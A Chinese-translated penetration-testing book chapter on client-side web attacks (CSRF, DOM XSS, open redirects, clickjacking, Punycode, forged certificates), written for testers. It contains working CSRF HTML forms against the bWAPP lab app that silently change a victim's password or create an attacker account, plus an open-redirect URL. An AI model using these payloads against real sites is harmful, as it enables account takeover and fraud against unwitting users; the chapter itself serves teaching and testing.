## 第十章。发动客户端攻击

Web 应用程序测试应该合理地关注我们正在测试的应用程序及其支持基础设施。到目前为止，我们关注的大多数攻击都对应用程序的前门进行了测试，或者利用客户端会话来获取非法访问。我们的客户将所有的安全预算都用于加固基础设施，其中一部分用于加固 Web 应用程序本身。也就是说，谁来照顾他们的客户端呢？

客户端本身的暴露以及用户的易受攻击性之间，我们将有多种测试向量。软件组合和用户行为的数量庞大，与其他服务和 Web 应用程序的重叠，以及访问方式的多样性（移动端与桌面端、漫游与代理、厚客户端与薄客户端与 Web 客户端等等），使得这对应用程序开发人员来说是一个极其艰巨的前线。他们最好的路径是加固应用程序本身，关闭任何漏洞，并确保应用程序关闭任何反射攻击向量和屏幕已经受到损害的主机。

大多数客户端渗透测试将以灰盒或白盒测试范围的形式出现，因为大部分攻击类型利用了应用程序自身的代码或脚本。这并不构成重大障碍，我们很快就会看到。在本章中，我们将看到多种方式，通过这些方式我们可以妥协终端点——无论是它们的通信还是主机本身。有了这些知识，就有了大量的 Web 应用程序攻击方式，可以降低目标服务的质量，这些必须进行彻底的调查。

本章将帮助您学习以下主题：

+   学习基于 DOM 的 XSS 攻击的工作原理以及如何实施它们

+   了解 JavaScript 嵌入如何被用来妥协客户端

+   学习如何使用客户端 URL 重定向和资源操纵

+   了解点击劫持和 Websockets 如何提供额外的进入客户端的途径

+   了解和实施执行跨站请求伪造和劫持通信的攻击

## 为什么客户端如此脆弱？

* * *

客户端攻击涵盖了 OWASP 2013 和 2017 年十大威胁类别中的几个。使用基于 DOM 的跨站脚本攻击（XSS）是一种利用验证中的弱点将脚本嵌入到 Web 响应中并将代码插入到客户端的强大方法。基于客户端的 DOM XSS 可以向客户端传递代码，以影响对 Web 应用程序所做的妥协，但黑客将利用各种漏洞来达到并影响客户端，例如未经验证的重定向和转发、Websockets 攻击或点击劫持。OWASP 十大 2013 年和 2017 年版本中的第三类漏洞是跨站请求伪造（CSRF），它利用受害者客户端作为枢纽，并利用其经过身份验证的状态来妥协其他站点。

还有其他攻击会渗透到 OWASP 十大中的其他领域，并且在之前的努力中已经涵盖过，但我们将在本章中重新讨论其中一些，以确保我们了解如何最好地测试和利用它们。这些威胁的共同点是它们利用了 Web 应用程序服务器端实现的问题，以影响客户端的行为或完整性。因为这些攻击通常意味着可以访问交付给客户端的代码，所以大多数这些技术在黑盒测试中不适用，而是在白盒或灰盒测试中使用。攻击者当然可能会从内部的角度使用这些技术，因此客户端攻击通常是从环境中的初始立足点到横向移动或特权升级攻击的一个组成部分。

### DOM，Duh-DOM DOM DOM!!

基于 DOM 的 XSS 应该让准备不足或未受保护的网络应用环境和负责团队感到恐慌。正如我们在第六章中讨论的*通过跨站脚本攻击渗透会话*，大多数 XSS 攻击利用了输入验证的缺失来插入脚本（通常是 JavaScript）以影响客户端如何解释或与网站交互。基于 DOM 的攻击是这些攻击的一个子集，它影响客户端的浏览器，其中 DOM 位于其中，以维护其对应用程序正在做什么和呈现什么的本地视图。通过嵌入脚本，用户当然可以影响客户端的行为，但目标和目的的多样性令人震惊，而且工具的强大（**浏览器利用框架**（**BeEF**）在协助 XSS 方面表现出色）。这些攻击主要集中在攻击客户端以黑客客户端并获取信息或专注于最终用户。

![](img/B03918_10_01.png)

2013 OWASP 十大概要#3：XSS 攻击

### 恶意误导

**未经验证的重定向**和**转发**包括**开放重定向**、**UI 伪装**或**客户端 URL 重定向**的漏洞。这些攻击类型涉及将恶意链接放入用户的路径，强制连接到意外站点以进行额外攻击，无论是启动恶意软件下载还是拦截未来的通信或凭据。网络应用程序本身也参与其中，因为这意味着开发人员没有部署足够的代码验证、会话管理，或者依赖于有缺陷、因此容易受到攻击的框架或模块。

OWASP 2013 十大威胁将这一威胁排名为第 10 位（如下图所示），但 2017 年版本（在当前草案中）已将其换成了**应用程序接口**（**API**）漏洞。这并不意味着未经验证的重定向和转发不再构成威胁，而是最近它们并不像以前那样普遍和令人担忧。这些攻击，如基于 DOM 的 XSS，往往以黑客用户为最终目标。

![](img/B03918_10_02.png)

2013 OWASP 十大概要#10：未经验证的重定向和转发

### 抓住我，如果你能！

1980 年的书籍和随后的 2002 年电影*抓住我，如果你能*是关于现实生活中的伪造者和骗子弗兰克·阿巴格内尔的一次伟大的冒险，他擅长操纵人们，让他们兑现伪造的支票或以其他方式代表他采取行动。黑客可以利用类似的社会工程技能和看起来真实的请求来将毫无戒心的客户端转向服务器，并利用他们的信任关系来传递恶意命令。**跨站请求伪造**（**CSRF**）是一种针对客户端使用应用程序漏洞的攻击，但实际上是为了将客户端转向其应用程序。

![](img/B03918_10_03.png)

2013 OWASP 十大概要#7：跨站请求伪造

## 欺负小家伙

* * *

现在我们知道攻击的目的是什么，我们有特权来测试和验证这些漏洞是否存在。在本节中，我将提供一些关于如何最好地在扫描这些功能时实现全面覆盖的指导，但我们还将探讨如何利用它们进行黑盒攻击和系统性渗透测试范围。

### 在别人的板上冲浪

CSRF 攻击（有时发音为*sea-surf*）隐藏了引用操作的实际意图，并将其埋藏在伪造的请求中。用户希望相信页面是按照其呈现的样子（因为嘿，它来自我信任的网络应用！），因此没有理由调查隐藏在主体或标题中的底层隐藏字段或请求操作，实际上这些操作对服务器发起了恶意行动。通过这些攻击，黑客可以让用户在不知情的情况下利用其经过身份验证的会话对服务器发起攻击，就像是使用他们的身份验证会话作为特洛伊木马一样。

在大多数代理扫描仪的扫描和蜘蛛功能中，都包括了对 CSRF 漏洞的潜在存在进行扫描--Burp Suite、OWASP ZAP 和 Wapati。Burp 通常会标记为这样（如下面的屏幕截图所示），并提供关于攻击含义以及如何防止的链接和指导：

![](img/B03918_10_04.png)

Burp Suite 的扫描显示 CSRF 漏洞

#### 简单的账户接管

然而，进行 CSRF 攻击通常不是使用这些工具进行的，而是使用浏览器和记事本。如果您发现在您的测试中进行 CSRF 攻击是有意义的，这里是一个执行这种攻击的示例。在这个练习中，我们将利用 OWASP BWA VM 和**Broken Web App**（BeeBox）再次导航到适当的页面（如下面的屏幕截图所示）：

![](img/B03918_10_05.png)

访问 bWAPP CSRF 练习链接

一旦我们进入门户，我们可以继续查看门户的源代码（在 Firefox 中，这涉及使用*Ctrl* + *U*或导航到**`工具`** | **`Web 开发人员`** | **`页面源`**）。这将显示页面上的 HTML（如下面的屏幕截图所示），但我们想要修改用户输入部分，以愚弄可怜的受害者改变他们的密码为我们所偏爱的密码。让我们继续复制这一部分（包括`<form`和`</form>`之间的所有内容）。

![](img/B03918_10_06.png)

收获 HTML 以进行 CSRF 利用

我们的目标是让已经经过身份验证的用户允许我们借用他们的账户并将他们的凭据更改为我们所偏爱的密码（他们真是太好了！）。我们可以通过修改字段来实现这一点，如图所示，在这里插入我们所偏爱的密码（用粗体文本突出显示）。我还更改了按钮的名称，以帮助掩盖正在发生的变化--您可以将其设置为**`登录`**或其他他们更有可能想要点击的内容：

```
<form action="/bWAPP/csrf_1.php" method="GET">
    <p><label for="password_new">New password:</label><br />
    <input type="password" id="password_new" name="password_new" value="dude"></p>
    <p><label for="password_conf">Re-type new password:</label><br />
    <input type="password" id="password_conf" name="password_conf" value="dude"></p>
    <button type="submit" name="action" value="change">Click Here</button>
</form>
```

当我们保存这个文件（我选择了`pw.html`）并查看它时，我们应该看到一组填充的字段，类似于我们在下面的屏幕截图中看到的。当用户点击这些 CSRF 片段时，如果原因模糊且字段被隐藏，这有助于我们。我们不希望他们知道我们正在强制更改密码（或者我们可能正在设计 CSRF 攻击以实现其他目的）。

![](img/B03918_10_07.png)

CSRF 修改的结果

```
<form action="/bWAPP/csrf_1.php" method="GET">) in the first line, which included a referential link to the referring page (/bWAPP/csrf_1.php). We need to replace that page with the full URL (as shown in the following screenshot) so that we can ensure that our form data is dropped into the real page's fields:
```

![](img/B03918_10_08.png)

我们的 HTML 中修改的字段

现在，我们修改后的 HTML 已经完成，但是我们如何将这份礼物送给我们的受害者呢？您可以将此攻击与 XSS 攻击相结合，通过电子邮件发送，或将其嵌入伪造的页面中。要测试代码本身，我们只需打开页面并单击**`点击这里`**按钮。幸运的话（在这些令人敬畏的黑客攻击中谁还需要运气？），您将看到与下面屏幕截图中所见类似的消息：

![](img/B03918_10_09.png)

CSRF 执行将受害者带到真正的页面

正如我们所看到的，这是一个非常有帮助的工具，可以 compromise 客户。黑客们不仅使用这个来修改凭据，还用来将资金重定向到不同的账户，并交付其他攻击修改（使用经过身份验证的用户来交付 XSS 或注入攻击）。幸运的是，有方法可以消除这些漏洞，但是 Web 应用程序需要包含这些方法。一些**内容管理系统**（**CMS**s）在结构中构建了保护措施（如 Joomla！、Drupal 等）；但对于一些框架和从头编写的 PHP 和 ASP.NET 页面，开发人员可能需要添加保护措施或加固他们的交互页面，使用 OWASP（[`www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)）或他们的 CMS 提供商的建议。

#### 你不知道我是谁吗？账户创建

接管一个账户可能在短期内奏效，但通常我们希望在应用程序上保持持久的存在，而不是让一个非常愤怒或沮丧的受害者试图夺回控制。如果我们能够访问管理员的账户或者愚弄管理员用户点击链接，有时我们可以让他们帮助我们自己创建一个账户！

诀窍是已经定位或准确猜测到新用户或账户创建页面的 URL。一旦我们做到了这一点，我们可以使用类似于我们第一次 CSRF 攻击的攻击来自动化账户创建，并将我们想要在其上使用的适当种子凭据传递给它。通过使用 bWAPP 再次进行演示，我们可以看到这是如何工作的，并从顶部菜单栏中选择**`创建用户`**。您将看到下面截图中显示的字段，我已经填写了我想要的账户信息：

![](img/B03918_10_10-1.png)

我们需要填写的创建用户字段

当我创建一个账户时，Burp 可以帮助我捕获字符串，其中包括我们想要的所有信息（如下截图所示）。现在，我们有两个选项可以尝试利用：CSRF 和 HTMP 注入，这些在第七章中已经涵盖了，*注入和溢出测试*。假设出于论证的目的，注入不可行（也许目标的开发人员已经关闭了这个漏洞），我们将进行 CSRF 攻击。

![](img/B03918_10_11.png)

为我们的伪造找到 URL 字符串

对于 CSRF 攻击，我可以从类似我捕获的 HTML 文件开始：

```
<form action="/bWAPP/user_extra.php" method="POST">
    <table>
    <tr><td>
        <p><label for="login">Login:</label><br />
        <input type="text" id="login" name="login"></p>
    </td>    
    <td width="5"></td>
    <td>
        <p><label for="email">E-mail:</label><br />
        <input type="text" id="email" name="email" size="30"></p>
    </td></tr>
    <tr><td>
        <p><label for="password">Password:</label><br />
        <input type="password" id="password" name="password"></p>
    </td>
    <td width="25"></td>
    <td>
        <p><label for="password_conf">Re-type password:</label><br />
        <input type="password" id="password_conf" name="password_conf"></p>
    </td></tr>
    <tr><td colspan="3">
        <p><label for="secret">Secret:</label><br />
        <input type="text" id="secret" name="secret" size="40"></p>        
    </td></tr>
    <tr><td>
        <p><label for="mail_activation">E-mail activation:</label>
        <input type="checkbox" id="mail_activation" name="mail_activation" value="">
    </td></tr>
    </table>
    <button type="submit" name="action" value="create">Create</button>
</form>
```

现在，为了特别隐秘，我们需要确保接收此页面的人不理解我们让他们做什么。诀窍是隐藏字段并利用隐藏属性来使我们的请求通过他们的好奇检查。我可以通过修改源代码来消除所有标签并隐藏所有用户输入，除了一个`submit`按钮，同时嵌入我想要的凭据而不让用户知道：

```
<form action="http://172.16.30.129/bWAPP/user_extra.php" method="GET">
        <input type="hidden" id="login" name="login" value="test1"></p>
        <input type="hidden" id="email" name="email" value="test1@example.com"></p>
        <input type="hidden" id="password" name="password" value="dude"></p>
        <input type="hidden" id="password_conf" name="password_conf" value="dude"></p>
        <input type="hidden" id="secret" name="secret" size="40" value="Hello Hackers"></p>
        <input type="hidden" id="mail_activation" name="mail_activation" value="">
        <button type="submit" name="action" value="create">Log In Here</button>
</form>
```

当受害者加载时，这将导致页面看起来像以下截图所示的页面。我们可以使该按钮看起来像任何东西（“赢得 100 万美元！”、“验证电子邮件”和“注册研讨会”都是可行的选项）。我们甚至可以将其嵌入到图片中作为链接；我们的目标是制作一个看起来无害且与用户预期行为相关的东西。

![](img/B03918_10_12.png)

简单的登录页面，对吧？

当用户点击这个按钮时，我们会看到可怜的认证受害者具有创建账户的权限，就像下面的截图中所示！关键在于知道预期的字段是什么。OSINT 可以帮助，因为通常新员工的说明和帮助门户会毫不保留地透露这一点。我们还可以根据组织内的其他趋势做出一些合理的猜测。

![](img/B03918_10_13-1.png)

账户已创建，谢谢！

应该注意的是，CSRF 是黑客和防御者之间非常活跃的猫鼠游戏创新领域。反 CSRF 令牌已经成为保护用户的手段；但是，就像所有漏洞一样，正如我们在本书中所看到的，执行通常是最薄弱的环节。如果使用了反 CSRF 令牌，黑客（和我们）可以尝试在我们的 CSRF 页面中使用 JavaScript 来捕获客户端的任何反 CSRF 令牌，并将其滑入我们的 GET 或 POST 请求中，以确保我们规避这种保护。更好的反 CSRF 实现将通过实施临时和上下文驱动的令牌来防止这种情况，但如果他们没有这样做，那么规避这些控制的可能性是相当大的。

### 相信我，我知道路！

对于这样一个长的名称，未经验证的重定向和转发漏洞使网站面临着极小的努力即可进行攻击，使攻击者能够将用户重定向到恶意网站或至少是意外的网站。我们可以使用自动化工具（如 Burp 或 ZAP）扫描网站，这些工具将通过一些线索来发现潜在的问题，例如使用完整站点路径或长重定向响应的页面，这两者都在此网站上看到（如下图所示），或者尝试在浏览器中指定扩展名或修改 URL：

![](img/B03918_10_14.png)

Burp Suite 扫描显示未经验证的重定向和转发漏洞

大多数网站在您在页面上悬停在链接上时仍然允许查看 URL，相关链接为*here*如下截图所示。这是在 OSINT 努力中直观发现此类风险的简单方法。

![](img/B03918_10_15.png)

识别候选超链接

作为替代，一些网站会隐藏超链接，但**`页面源代码`**应该向我们显示这一点，如下图所示。对于这个网站，我们可以看到他们正在使用前面提到的相对链接，如果网站验证只返回相对链接，通常会提供更好的保护。如果他们使用显式的完整链接或允许它们代替站点范围的相对链接，这通常会表明一些不太严格编码的验证。这也是发现任何其他相关脚本或非明显超链接的好方法，这些也可能是先前讨论的 CSRF，隐藏字段利用等的潜在线索：

![](img/B03918_10_16.png)

查看源代码通常会显示更多

要注意的部分是 URL 中`?`之后的部分。正如我们以前所见，直接包含命令、脚本、字段，现在又是另一个页面链接，为黑客提供了许多途径来插入他们自己的调整，启动命令，甚至引导客户端到站点的**完全合格域名**（**FQDN**）。对于这种攻击，我们可以简单地开始调整 URL 字符串，并尝试添加我们自己的重定向。显然，这可能是试图欺骗用户访问我们的恶意门户或启动恶意软件下载的更大尝试的一部分，但现在，让我们只用一个良性的重定向来证明它，方法如下：

```
http://172.16.30.129/bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=https://www.hackthissite.org/
```

看哪！我们已经把用户重定向到我们的恶意网站，这种情况下，只是我们最喜欢的练习网站[www.hackthissite.org](http://www.hackthissite.org)（如图所示）：

![](img/B03918_10_17.png)

重定向成功！

这种简单的方法经常被忽视，但当 URL 作为电子邮件中的超链接隐藏时，无论是完全隐藏还是只显示 URL 的预期部分，用户都很有可能点击它。如果 URL 之后的操作包括让用户访问具有他们可以提供的身份验证的站点，这可以为黑客提供足够大的立足点来利用。很少有这种攻击单独存在；通常用于协助横向移动或在更全面的攻击生命周期早期劫持会话。

## 我不需要你的验证

* * *

在 Web 应用程序中进行验证是消除或减少威胁的重要步骤。 XSS，注入，CSRF，未经验证的重定向和转发攻击都利用了应用程序中的缺陷，允许对字段进行操纵，暴露先前隐藏的功能或未使用的组件，并且缺乏语法强制执行。这里列出了一些附加的验证样式攻击，并且通常可以通过全功能扫描和代理工具很好地检测到：

+   CSS 注入：CSS 注入寻找常见样式表中容易受到操纵或注入攻击的代码（不要与 XSS 或跨站点脚本混淆）。与 XSS 和 CSRF 一样，这可以用于插入脚本或引起流量重定向，从而导致数据外泄或凭据、令牌和其他敏感信息的捕获。在极端情况下，可以通过这种方式传递持久性。

+   客户端资源操纵：实际上是 XSS 的一个变种，这些攻击侧重于请求或响应中各种用户可控元素，这些元素可以导致客户端在浏览器内执行恶意命令或进程。CSS 注入是这种攻击的一种变体，但其他常见的目标是网页中的 iFrames 和其他链接对象（图像、引用、脚本、对象等）。iFrames 是提供单个页面多个内容来源的常见方式，在许多新闻和电子商务网站中使用。

+   Web 套接字：Web 套接字攻击并没有像预期的那样普遍，因为你有多少次看到应用程序在 URL 中使用`ws://`或`wss://`而不是 HTTP 调用？Web 套接字被设想为一种方式，可以在客户端和服务器之间提供全双工、异步通信链接，能够承载多个 TCP 连接。嗯，它们并没有完全起飞，但如果它们真的流行起来，你可以使用 Google Chrome 的扩展或 OWASP 的 ZAP 工具来测试它们的问题。与 HTTP 一样，我们希望我们的 Web 套接字受到当前版本的 TLS 的保护，因此许多常见的 OpenSSL 或基于加密的攻击都是公平的游戏。它们还应该在其标头中有严格的来源标签规则，以便可以测试客户端资源操纵和各种注入攻击。

+   跨站点闪烁：跨站点闪烁与 XSS 非常相似，只是它针对 Adobe Flash 嵌入，这与 PDF、Java jar 文件和生产软件一样，是恶意软件的常见传递机制。通过更改嵌入文件，黑客可以植入恶意软件或实现更多面向网络的目标，例如收集凭据和 Cookie。

+   跨域资源共享（CORS）：这利用了本章涵盖的许多攻击中缺乏验证的特点。大多数应用程序将确保标头使用多个参数进行通信，我们需要测试在请求超出原始域的范围之前需要多少额外的验证。如果 Web 开发人员允许这些标头使用通配符或禁用这些检查，那么这提供了攻击的手段。标头检查是主要的测试方法，但如果存在漏洞，它可以通过类似 CSRF 的代码操纵来利用。

## 时尚的黑客技术来来去去

* * *

最近客户端攻击的趋势集中在规避许多受信任的保护机制并提高用户意识。虽然我不会详细介绍这些内容，但值得注意它们的潜力，并考虑如何在自己的测试中评估和利用这些漏洞。

### 点击劫持（bWAPP）

**点击劫持**曾是几年前一种普遍的攻击方法，以其在 Facebook、Twitter、亚马逊和其他知名网站上的使用而引人注目。在所有这些攻击中，黑客们诱使用户点击伪装或隐藏的链接，以启动恶意页面或脚本。简单的 HTML 可以提供重叠的 iFrame 或其他机制，用户无法清楚地看到其存在，黑客可以利用这一点在合法网站组件的顶部覆盖一个按钮，使他们认为他们点击的是一个控件，实际上他们点击的是一个恶意操作，通常是为了获取他们的凭证、窃取 cookie，甚至钩住浏览器。这些技术在现代浏览器版本中已经得到解决，但值得注意的是这种技术曾经存在。

### Punycode

大多数使用英语的网络用户并不知道世界各地的 DNS 中使用了许多不同的字母表。虽然英语、日耳曼语和罗曼语键盘可能不知道这一点，但浏览器完全能够渲染这些字符以适应使用亚洲、非洲和中东更广泛字母表的用户和公司。妥协的方法是实施一种编码方案，以便浏览器和其他应用程序能够准确地引用其他字符，这就是**Punycode**。这确实会引起一些混淆，因为不同语言中有一些看起来几乎相同但实际上是不同的字母或符号。2017 年 4 月，研究人员发布了警告（[`www.xudongz.com/blog/2017/idn-phishing/`](https://www.xudongz.com/blog/2017/idn-phishing/)），警告黑客试图利用这些相似之处。苹果（Safari）、Mozilla（Firefox）和谷歌（Chrome）等浏览器制造商正在努力提供额外的保护，但这证明了需要更高级别的基于 DNS 的保护。预计在本书出版时，大多数浏览器都将采取缓解措施，但当然，我们需要验证这些更新是否已经到位。

### 伪造或劫持证书

证书和**公钥基础设施**（**PKI**）是网络和企业信任的基础。这种安排的前提是，如果双方都使用受信任的第三方进行相互认证，会出现什么问题？嗯，黑客们一直在尝试伪造证书，依赖于配置错误的证书、浏览器和松散的服务器端实现。这些都相当容易暴露和防御，但一些新的动态正在计划中。

据称针对伊朗离心机的**Stuxnet**恶意软件活动（[`www.wired.com/2014/11/countdown-to-zero-day-stuxnet/`](https://www.wired.com/2014/11/countdown-to-zero-day-stuxnet/)）在攻击期间做了许多具有指导意义和前所未有的事情。作为一种蠕虫，它通过隐藏在.LNK 文件中的脚本在目标环境中传播，特别阴险的是这些文件会自动打开并渲染以显示文件类型的图标。一旦进入机器，它建立了内核级别的访问和持久性，同时掩盖了其他帮助传播和执行蠕虫的进程。最令人震惊的发现是它使用了经过签名的软件，使用了真实硬件供应商的证书和私钥进行验证。这种情况对 PKI 社区来说是一个巨大的打击，许多公司开始确保这种情况不会再次发生。

快进几年，现在恶意软件供应商和网络黑客发现，现在可以免费或廉价获得证书颁发机构，这可以帮助他们为其恶意软件或恶意网络门户获得合法证书。再加上 punycode 或其他域名**恶作剧**，我们现在看到 XSS 将用户引导到恶意门户，这些门户通过 Firefox 中的明显*受信任站点*图标欺骗用户。值得注意的是，这些攻击仍然很少见，但我们应该期望更多的黑客将尝试在未来利用它们，作为对网络上 TLS 使用的普及和浏览器默认设置的反制措施，这些设置阻止接受自签名、过期或伪造证书，除非明确绕过。作为测试人员，我们将希望确保我们的扫描显示适当的 PKI 配置，仅使用最新版本的 TLS，并且企业浏览器标准不会妥协证书验证，甚至决定采用明确的证书配置，以避免签名恶意软件或重定向：

![](img/B03918_10_18.png)

证书信任不再是过去的样子

## 摘要

* * *

客户端漏洞及其利用暴露了大多数 Web 开发人员的盲点；他们不习惯拥有客户端平台上的安全性，并且可能会陷入只保护他们的框架或应用程序的陷阱。黑客将这视为一个巨大的机会。他们可以妥协最终用户，同时从他们那里转移，利用他们的经过身份验证或缓存状态，从而妥协 Web 服务器。作为一个社区，我们需要确保应用程序所有者明白，加强网站防范客户端漏洞的利益最大化，因为改进客户端安全性会显著减少应用程序本身的攻击面。

这并不容易——操作系统、浏览器、补丁级别、访问模式和其他因素的近乎无限的组合可能会影响客户端的暴露。基于最佳实践的设计、打补丁和对细节的关注是对这些潜在致命缺陷的最好防御。我们还应努力鼓励在可能的情况下使用经过充分测试的框架，而不是自定义组件。与第九章 *压力测试身份验证和会话管理*中讨论的身份验证和会话管理漏洞一样，我们更愿意从这些广泛可用的组件的更大足迹和广泛审查和审查中受益，而不是发现我们的目标的独特实现存在漏洞，直到被黑客利用。

在下一章中，我们将通过测试来看一下如何对应用程序的业务逻辑进行测试。这最后的纪律真正关注应用程序层的设计和错误处理，虽然我们会看到一些主题重现（比如注入和模糊测试），但我们真的希望确保即使经过身份验证的用户也无法*破坏*目标并引起问题或访问意外的数据或功能。虽然本章重点是 HTML，并且只是少量使用了我们的工具集，第十一章 *破解应用程序逻辑*将会重新使用 Burp 和 ZAP，因为它们的自动化能力将对覆盖网站可能期望的所有迭代起到巨大的帮助。我们几乎到了尽头，但希望您仍在建立您的武器库，并看到网络应用程序渗透测试的规模和乐趣有多大！
